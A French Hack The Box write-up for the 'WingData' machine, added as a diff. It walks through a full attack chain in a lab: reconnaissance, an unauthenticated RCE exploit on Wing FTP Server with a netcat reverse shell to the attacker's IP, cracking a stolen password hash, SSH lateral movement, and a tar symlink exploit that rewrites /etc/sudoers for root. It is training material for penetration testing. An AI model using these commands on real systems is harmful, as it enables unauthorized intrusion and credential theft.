@@ -1,0 +1,190 @@
+# 🧠 HTB Write-up : WingData (Facile)
+
+| **Machine** | WingData |
+| **Difficulté** | Facile |
+| **OS** | Linux |
+| **Release** | Saison 10 |
+| **Techniques** | CVE-2025-47812 (RCE), CVE-2025-4517 (PrivEsc), craquage de mots de passe, mouvement latéral, sudo mal configuré |
+
+---
+
+## 📌 Résumé
+
+WingData est une machine Linux facile qui démontre une chaîne d'attaque réaliste :
+
+1. **Accès initial** via une RCE non authentifiée (CVE-2025-47812) sur Wing FTP Server v7.4.3
+2. **Collecte d'identifiants** dans les fichiers de configuration FTP
+3. **Mouvement latéral** via mot de passe cracké → accès SSH en tant que `wacky`
+4. **Élévation de privilèges** via un script de restauration de sauvegarde mal sécurisé (CVE-2025-4517) → root
+
+---
+
+## 🔍 Reconnaissance
+
+### Scan Nmap
+
+```bash
+nmap -sCV -A 10.129.6.225
+Ports ouverts :
+
+22/tcp → OpenSSH 9.2p1 Debian 12
+
+80/tcp → Apache HTTP Server 2.4.66 (redirige vers wingdata.htb)
+
+Ajouter au fichier /etc/hosts :
+
+bash
+echo "10.129.6.225 wingdata.htb ftp.wingdata.htb" | sudo tee -a /etc/hosts
+🌐 Énumération Web
+En visitant http://wingdata.htb, on découvre un site d'entreprise.
+En cliquant sur Client Portal, on est redirigé vers http://ftp.wingdata.htb → Client Web Wing FTP Server.
+
+La version est affichée en bas de page :
+
+text
+Wing FTP Server v7.4.3
+Fuzzing de répertoires
+bash
+ffuf -u http://wingdata.htb/FUZZ -w /usr/share/wordlists/dirb/common.txt -mc 200,301,302,403 -t 40
+Résultats intéressants :
+
+/assets
+
+/vendor (suggère des dépendances PHP)
+
+.htaccess, .htpasswd (403 interdit)
+
+💥 Accès Initial : CVE-2025-47812 (RCE non authentifiée)
+Recherche de vulnérabilité
+CVE-2025-47812 permet l'exécution de code à distance non authentifiée sur Wing FTP Server v7.4.3.
+
+Préparation de l'exploit
+bash
+git clone https://github.com/4m3rr0r/CVE-2025-47812-poc.git
+cd CVE-2025-47812-poc
+Listener reverse shell
+bash
+nc -lvnp 5555
+Exécution de l'exploit
+bash
+python3 CVE-2025-47812.py -u http://ftp.wingdata.htb -c "nc 10.10.14.79 5555 -e /bin/sh" -v
+✅ Reverse shell reçu en tant qu'utilisateur wingftp.
+
+Amélioration du shell
+bash
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+🗂️ Post-exploitation & Collecte d'identifiants
+Découverte des utilisateurs
+bash
+ls /home
+→ wingftp, wacky
+
+Configuration du serveur FTP
+bash
+cd /opt/wftpserver/Data/1/users
+cat wacky.xml
+Hash extrait :
+
+xml
+<Password>32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca</Password>
+🔓 Craquage du mot de passe
+Préparer le fichier de hash
+bash
+echo "32940defd3c3ef70a2dd44a5301ff984c4742f0baae76ff5b8783994f8a503ca:WingFTP" > wacky_hash.txt
+Craquer avec Hashcat
+bash
+hashcat -m 1410 wacky_hash.txt /usr/share/wordlists/rockyou.txt
+✅ Mot de passe récupéré : !#7Blushing^*Bride5
+
+🚪 Mouvement Latéral : SSH en tant que wacky
+bash
+sshpass -p '!#7Blushing^*Bride5' ssh -o StrictHostKeyChecking=no wacky@10.129.6.225
+✅ Accès obtenu → wacky@wingdata:~$
+
+Flag utilisateur
+bash
+cat user.txt
+text
+********************************
+🔐 Énumération pour l'élévation de privilèges
+Privilèges sudo
+bash
+sudo -l
+Sortie :
+
+text
+User wacky may run the following commands on wingdata:
+    (root) NOPASSWD: /usr/local/bin/python3 /opt/backup_clients/restore_backup_clients.py *
+Analyse du script
+bash
+cat /opt/backup_clients/restore_backup_clients.py
+Le script restaure des archives .tar depuis /opt/backup_clients/backups vers un répertoire de staging.
+
+Ligne critique :
+
+python
+tar.extractall(path=staging_dir, filter="data")
+Exécuté en root → vulnérable à une attaque par symlink/hardlink (CVE-2025-4517).
+
+⚡ Élévation de privilèges : CVE-2025-4517
+Transfert de l'exploit
+Machine attaquante :
+
+bash
+git clone https://github.com/AzureADTrent/CVE-2025-4517-POC-HTB-WingData.git
+cd CVE-2025-4517-POC-HTB-WingData
+python3 -m http.server 80
+Machine cible :
+
+bash
+cd /tmp
+wget http://10.10.14.79/CVE-2025-4517-POC.py
+Exécution de l'exploit
+bash
+python3 /tmp/CVE-2025-4517-POC.py
+L'exploit :
+
+Crée une archive tar malveillante avec symlinks + hardlink vers /etc/sudoers
+
+Injecte wacky ALL=(ALL) NOPASSWD: ALL
+
+Déclenche le script de restauration en tant que root
+
+Shell root
+bash
+sudo /bin/bash
+id
+# uid=0(root) gid=0(root)
+Flag root
+bash
+cat /root/root.txt
+text
+********************************
+📁 Flags
+Flag	Emplacement
+Utilisateur	/home/wacky/user.txt
+Root	/root/root.txt
+🧰 Outils utilisés
+Outil	Rôle
+nmap	Scan de ports
+ffuf	Fuzzing de répertoires
+hashcat	Craquage de mot de passe
+sshpass	Connexion SSH non interactive
+nc	Listener reverse shell
+python3	Exécution des exploits
+wget	Transfert de fichiers
+🔗 Références
+CVE-2025-47812 PoC
+
+CVE-2025-4517 PoC
+
+🧠 Leçons apprises
+Toujours énumérer les sous-domaines et les versions
+
+Les identifiants utilisateur peuvent être stockés de manière insecure dans les configs de services
+
+La réutilisation de mots de passe facilite le mouvement latéral
+
+Un script sudo qui manipule des archives fournies par l'utilisateur est dangereux
+
+Les attaques par liens symboliques sont toujours d'actualité en 2026
